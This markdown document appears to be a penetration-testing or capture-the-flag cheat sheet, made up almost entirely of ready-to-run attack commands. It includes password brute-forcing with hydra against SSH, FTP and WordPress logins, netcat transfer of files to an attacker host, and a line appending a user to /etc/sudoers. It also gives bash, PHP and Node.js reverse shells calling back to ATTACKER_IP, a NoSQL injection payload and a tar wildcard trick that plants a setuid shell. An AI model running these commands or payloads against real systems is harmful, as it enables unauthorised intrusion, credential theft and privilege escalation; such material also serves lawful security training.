# Network and Web Enumeration

## Port Scanning and Service Detection

```bash
nmap -sV -p- <TARGET_IP>
```

## Directory and File Discovery

```bash
gobuster dir -u https://<TARGET_IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,js
```

```bash
gobuster dir -u https://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

## SMB and NetBIOS Enumeration

```bash
enum4linux <TARGET_IP>
```

## DNS Reconnaissance

```bash
dnsrecon -d <TARGET_DOMAIN> -n <TARGET_IP>
```

# File Transfer Methods

## HTTP Server Setup

```bash
python -m http.server
```

```bash
python -m SimpleHTTPServer
```

```bash
wget http://<ATTACKER_IP>:8000/<FILE_NAME>
```

## Netcat File Transfer

```bash
nc -lvnp 5555 > <FILE_NAME>
```

```bash
nc <ATTACKER_IP> 5555 < <FILE_NAME>
```

## Secure File Transfer

```bash
scp <USER_NAME>@<TARGET_IP>:<FILE_NAME> .
scp ./* <USER_NAME>@<TARGET_IP>:<FILE_PATH>
```

# Linux Privilege Escalation and System Commands

## Privilege and Permission Analysis

```bash
sudo -l
```

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
find / -user <USER_NAME> -type f 2>/dev/null
```

## Shell Upgrade and Stabilization

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Sudo Privilege Modification

```bash
echo 'echo "<USER_NAME> ALL=(ALL:ALL) ALL" >> /etc/sudoers;' >> <FILE_NAME>
```

# Windows Privilege Escalation and System Commands

## Privilege and Permission Analysis

```bash
whoami /priv
```

```bash
evil-winrm -i <TARGET_IP> -u <USER_NAME> -p <PASSWORD>
```

```bash
net user <USER_NAME> <PASSWORD>
```

# Steganography and Image Analysis

## Metadata Extraction

```BASH
exiftool <IMAGE_NAME>.jpg
```

## Hidden Data Extraction

```bash
stegseek <IMAGE_NAME>.jpg
```

```bash
binwalk -e <IMAGE_NAME>.png
```

```bash
steghide extract -sf <IMAGE_NAME>.jpg
```

## Binwalk Compatibility Fix

```Bash
sed -i 's/CS_ARCH_ARM64/CS_ARCH_AARCH64/g' /usr/lib/python3/dist-packages/binwalk/modules/disasm.py
```

# Password Generation and Cracking

## Custom Wordlist Generation

```bash
crunch 18 18 -t '@@@@' > file.txt
```

## Network Service Brute Force Attacks

```bash
hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

```bash
hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

```bash
hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get -s 8080 /
```

```bash
hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
```

```bash
hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 32
```

```bash
wpscan --url <TARGET_IP> -U <LOGIN> -P /usr/share/wordlists/rockyou.txt
```

## Archive Password Cracking

```bash
zip2john <FILE_NAME>.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Certificate Password Cracking

```bash
pfx2john <FILE_NAME>.pfx > cert.hash
john --wordlist=/usr/share/wordlists/rockyou.txt cert.hash
```

## SSH Key Hash Extraction

```bash
/opt/john/ssh2john.py key > key.hash
```

# File Transfer Protocol (FTP) Operations

## Basic FTP Commands

```bash
ftp <TARGET_IP>
anonymous
ls -la
get <FILE_NAME>
prompt off
mget *
put <FILE_NAME>
```

# Server Message Block (SMB) Enumeration

## SMB Share Discovery

```bash
smbclient -L //<TARGET_IP> -N
```

```bash
smbclient -L //<TARGET_IP> -U <USER_NAME>
```

# Reverse Shell Techniques

## Netcat Listener Setup

```bash
nc -lvnp 4444
```

## Bash Reverse Shells

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > script.sh
```

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f" > script.sh
```

## PHP Reverse Shells

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
?>
```

## Node.js Reverse Shell

```js
require("child_process").exec(
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f"
);
```

# Metasploit Framework Usage

## Metasploit Commands

```bash
msfconsole
show options
set
run
```

# MongoDB

## Database Navigation Commands

```bash
mongo
show dbs
use
```

## NoSQL Injection Payloads

```
{"username":"test","password":{"$ne":""}}
```

# Crontab

## Enumeration

```bash
cat /etc/crontab
```

```bash
cd /etc/cron.d
```

## Tar Wildcard Injection

```bash
echo -e '#!/bin/bash \ncp /bin/bash /home/<USER_NAME>\nchmod +s /home/<USER_NAME>/bash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

# Buffer Overflow

## Testing

```bash
(python -c 'print "A"*67') | <FILE_NAME>
```

# Online Tools and Resources

- [CyberChef](https://gchq.github.io/CyberChef/)
- [dCode](https://www.dcode.fr/en)
- [GTFOBins](https://gtfobins.github.io/)
- [Exploit Database](https://www.exploit-db.com/)
- [CrackStation](https://crackstation.net/)
- [MD5Hashing.net](https://md5hashing.net)
- [GitTools](https://github.com/internetwache/GitTools)
- [Boxentriq](https://www.boxentriq.com/)
